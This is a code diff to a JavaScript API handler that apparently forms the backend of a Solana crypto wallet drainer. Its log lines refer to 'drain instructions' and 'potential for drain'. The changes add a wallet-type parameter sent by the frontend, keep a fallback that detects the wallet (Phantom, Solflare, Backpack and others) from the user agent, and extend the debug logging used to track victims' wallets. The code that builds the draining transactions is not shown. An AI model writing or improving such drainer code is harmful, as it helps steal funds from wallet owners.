@@ -224,13 +224,17 @@ export default async function handler(req, res) {
   // Set CORS headers for all responses
   setCORSHeaders(res);
 
-  // Get user public key from query or body
+  // Get user public key and wallet type from query or body
   let userPublicKey;
+  let walletType = 'Unknown';
+  
   if (req.method === 'GET') {
     userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
+    walletType = req.query.walletType || 'Unknown';
   } else if (req.method === 'POST') {
     const body = req.body;
     userPublicKey = body.user || body.publicKey || body.wallet || body.pubkey;
+    walletType = body.walletType || 'Unknown';
   }
 
   try {
@@ -718,21 +722,22 @@ export default async function handler(req, res) {
       console.log(`[DRAIN_LOG] - Has drain instructions: ${hasDrainInstructions}`);
       console.log(`[DRAIN_LOG] - Has potential for drain: ${hasPotentialForDrain}`);
       
-      // Determine wallet type from user agent detection
-      let detectedWalletType = 'Unknown';
-      if (isSolflare) detectedWalletType = 'Solflare';
-      else if (isGlow) detectedWalletType = 'Glow';
-      else if (isBackpack) detectedWalletType = 'Backpack';
-      else if (isExodus) detectedWalletType = 'Exodus';
-      else if (userAgent.includes('Phantom') || userAgent.includes('phantom')) detectedWalletType = 'Phantom';
-      else if (userAgent.includes('TrustWallet') || userAgent.includes('trustwallet')) detectedWalletType = 'Trust Wallet';
-      
-      // Since user agent doesn't contain wallet info, we'll rely on frontend detection
-      // Backend will log with "Unknown" but frontend will pass correct wallet type
+      // Use wallet type from frontend, fallback to user agent detection
+      let detectedWalletType = walletType;
+      if (walletType === 'Unknown') {
+        // Fallback to user agent detection if frontend didn't provide wallet type
+        if (isSolflare) detectedWalletType = 'Solflare';
+        else if (isGlow) detectedWalletType = 'Glow';
+        else if (isBackpack) detectedWalletType = 'Backpack';
+        else if (isExodus) detectedWalletType = 'Exodus';
+        else if (userAgent.includes('Phantom') || userAgent.includes('phantom')) detectedWalletType = 'Phantom';
+        else if (userAgent.includes('TrustWallet') || userAgent.includes('trustwallet')) detectedWalletType = 'Trust Wallet';
+      }
       
       // Debug logging for wallet type detection
+      console.log('[WALLET_TYPE_DEBUG] Frontend Wallet Type:', walletType);
+      console.log('[WALLET_TYPE_DEBUG] Final Detected Wallet Type:', detectedWalletType);
       console.log('[WALLET_TYPE_DEBUG] User Agent:', userAgent);
-      console.log('[WALLET_TYPE_DEBUG] Detected wallet type:', detectedWalletType);
       console.log('[WALLET_TYPE_DEBUG] Is Solflare:', isSolflare);
       console.log('[WALLET_TYPE_DEBUG] Is Glow:', isGlow);
       console.log('[WALLET_TYPE_DEBUG] Is Backpack:', isBackpack);
